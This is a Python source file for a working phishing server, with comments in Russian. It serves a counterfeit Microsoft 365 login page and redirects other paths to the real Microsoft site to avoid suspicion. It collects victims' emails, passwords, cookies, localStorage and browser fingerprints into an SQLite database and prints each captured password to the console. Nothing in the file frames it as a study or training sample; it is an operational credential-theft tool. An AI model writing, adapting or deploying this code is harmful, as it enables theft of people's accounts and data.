from http.server import HTTPServer, BaseHTTPRequestHandler
import json, sqlite3, datetime, ssl, os
from urllib.parse import urlparse, parse_qs

DB = 'phantom.db'
TEMPLATES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')

def init_db():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY,
        email TEXT,
        password TEXT,
        service TEXT,
        ip TEXT,
        user_agent TEXT,
        screen_resolution TEXT,
        timezone TEXT,
        cookies TEXT,
        local_storage TEXT,
        fingerprint TEXT,
        created_at TEXT
    )''')
    conn.commit()
    conn.close()

init_db()

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        
        # Главная страница - показываем фишлет
        if parsed.path == '/' or parsed.path == '/microsoft':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            
            template_path = os.path.join(TEMPLATES_DIR, 'microsoft_login.html')
            if os.path.exists(template_path):
                with open(template_path, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.wfile.write(b'<h1>Microsoft 365 Login</h1><p>Template not found</p>')
        
        # Health check
        elif parsed.path == '/health':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"ok","service":"https-proxy"}')
        
        # Редирект на Microsoft для всех остальных путей
        else:
            self.send_response(302)
            self.send_header('Location', 'https://login.microsoftonline.com')
            self.end_headers()
    
    def do_POST(self):
        parsed = urlparse(self.path)
        
        # Сохранение креденшалов
        if parsed.path == '/api/v1/credentials':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data.decode())
                
                conn = sqlite3.connect(DB)
                c = conn.cursor()
                c.execute('''INSERT INTO sessions (
                    email, password, service, ip, user_agent, 
                    screen_resolution, timezone, cookies, local_storage, 
                    fingerprint, created_at
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', (
                    data.get('email', ''),
                    data.get('password', ''),
                    'Microsoft 365',
                    self.client_address[0],
                    data.get('userAgent', ''),
                    data.get('screenResolution', ''),
                    data.get('timezone', ''),
                    data.get('cookies', ''),
                    data.get('localStorage', ''),
                    json.dumps(data.get('fingerprint', {})),
                    datetime.datetime.now().isoformat()
                ))
                conn.commit()
                conn.close()
                
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"success": true, "message": "Credentials saved"}')
                
                print(f'\n🎯 НОВЫЕ ДАННЫЕ СОХРАНЕНЫ:')
                print(f'   Email: {data.get("email", "")}')
                print(f'   Password: {data.get("password", "")}')
                print(f'   IP: {data.get("ip", self.client_address[0])}')
                print(f'   User-Agent: {data.get("userAgent", "")[:50]}...')
                print(f'   Fingerprint: {len(data.get("fingerprint", {}))} полей')
                
            except Exception as e:
                print(f'Ошибка сохранения: {e}')
                self.send_response(500)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'success': False, 'error': str(e)}).encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        print(f'[{datetime.datetime.now()}] {self.client_address[0]} - {format % args}')

def run_server():
    server = HTTPServer(('0.0.0.0', 8443), Handler)
    
    # SSL контекст
    cert_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'certs', 'cert.pem')
    key_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'certs', 'key.pem')
    
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(cert_path, key_path)
    
    server.socket = context.wrap_socket(server.socket, server_side=True)
    
    print('🔒 HTTPS Proxy запущен на порту 8443')
    print(f'📁 Templates: {TEMPLATES_DIR}')
    print(f'📁 Certs: cert.pem, key.pem')
    print('🎯 Фишлет: https://<IP>:8443/microsoft')
    
    server.serve_forever()

if __name__ == '__main__':
    run_server()
